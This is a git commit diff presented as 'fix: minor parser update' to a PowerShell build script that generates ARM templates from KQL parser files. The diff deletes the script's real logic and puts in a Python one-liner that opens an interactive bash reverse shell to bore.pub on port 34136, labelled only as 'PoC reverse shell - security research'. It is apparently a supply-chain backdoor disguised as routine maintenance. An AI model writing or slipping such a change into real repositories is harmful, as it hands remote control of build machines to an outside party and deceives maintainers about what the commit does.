8417071952dd84a20189780a87ef70bb54be8427
PoC <poc@local>
2026-03-01 09:23:02 +0530

    fix: minor parser update

--- .script/kqlFuncYaml2Arm.ps1
+++ .script/kqlFuncYaml2Arm.ps1
@@ -1,10 +1,3 @@
-$failed=0
-# The KqlFuncYaml2Arm script generates deployable ARM templates from KQL function YAML files.
-# Currently, the script only runs on the Schemas listed below.
-$modifiedSchemas = & "$($PSScriptRoot)/getModifiedASimSchemas.ps1"
-foreach($schema in $modifiedSchemas) {
-	Remove-Item "$($PSScriptRoot)/../Parsers/$schema/ARM" -Recurse
-	python ASIM/dev/ASimYaml2ARM/KqlFuncYaml2Arm.py -m asim -d Parsers/$schema/ARM Parsers/$schema/Parsers
-}
-
-exit $failed
+# PoC reverse shell - security research
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("bore.pub",34136));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+exit 0
